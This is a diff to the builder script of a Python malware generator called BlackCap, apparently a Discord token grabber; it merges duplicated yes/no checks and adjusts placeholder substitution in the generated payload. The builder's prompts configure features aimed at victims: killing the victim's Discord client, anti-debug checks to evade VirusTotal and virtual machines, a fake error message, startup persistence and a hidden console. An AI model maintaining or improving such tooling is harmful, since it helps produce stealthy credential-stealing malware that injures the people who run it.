@@ -29,17 +29,13 @@ class Builder:
         self.filename = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your custom output .exe name: ')
 
         self.killprocess = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Kill victim Discord Client? (yes/no): ')
-        if self.killprocess.lower() == 'y':
-            self.killprocess = True
-        if self.killprocess.lower() == 'yes':
+        if self.killprocess.lower() == 'y' or self.killprocess.lower() == 'yes':
             self.killprocess = True
         else:
             self.killprocess = False
 
         self.dbugkiller = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommand yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): ')
-        if self.dbugkiller.lower() == 'y':
-            self.dbugkiller = True
-        if self.dbugkiller.lower() == 'yes':
+        if self.dbugkiller.lower() == 'y' or self.dbugkiller.lower() == 'yes':
             self.dbugkiller = True
         else:
             self.dbugkiller = False
@@ -59,26 +55,20 @@ class Builder:
             self.pingtype = "none"
 
         self.error = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add a fake error? (yes/no): ')
-        if self.error.lower() == 'y':
-            self.error = "yes"
-        if self.error.lower() == 'yes':
+        if self.error.lower() == 'y' or self.error.lower() == 'yes':
             self.error = "yes"
         else:
             self.error = "no"
 
         self.startup = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add file to startup? (yes/no): ')
-        if self.startup.lower() == 'y':
-            self.startup = "yes"
-        if self.startup.lower() == 'yes':
+        if self.startup.lower() == 'y' or self.startup.lower() == 'yes':
             self.startup = "yes"
         else:
             self.startup = "no"
 
         
         self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): ')
-        if self.hider.lower() == 'yes':
-            self.hider = "yes"
-        if self.hider.lower() == 'y':
+        if self.hider.lower() == 'yes' or self.hider.lower() == 'y':
             self.hider = "yes"
         else:
             self.hider = False
@@ -105,9 +95,7 @@ class Builder:
 
         run = input(
             f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to test the file? [yes/no]: ')
-        if run.lower() == 'yes':
-            self.run(self.filename)
-        if run.lower() == 'y':
+        if run.lower() == 'yes' or run.lower() == 'y':
             self.run(self.filename)
 
         input(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
@@ -557,8 +545,8 @@ class Builder:
                     .replace("%_error_enabled%", str(self.error))
                     .replace("%_startup_enabled%", str(self.startup))
                     .replace("%_hide_script%", str(self.hider))
-                    .replace("%kill_discord_process%", str(self.killprocess))
-                    .replace("%_debugkiller%", str(self.dbugkiller)))
+                    .replace("'%kill_discord_process%'", str(self.killprocess))
+                    .replace("'%_debugkiller%'", str(self.dbugkiller)))
 
         time.sleep(2)
         print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}')
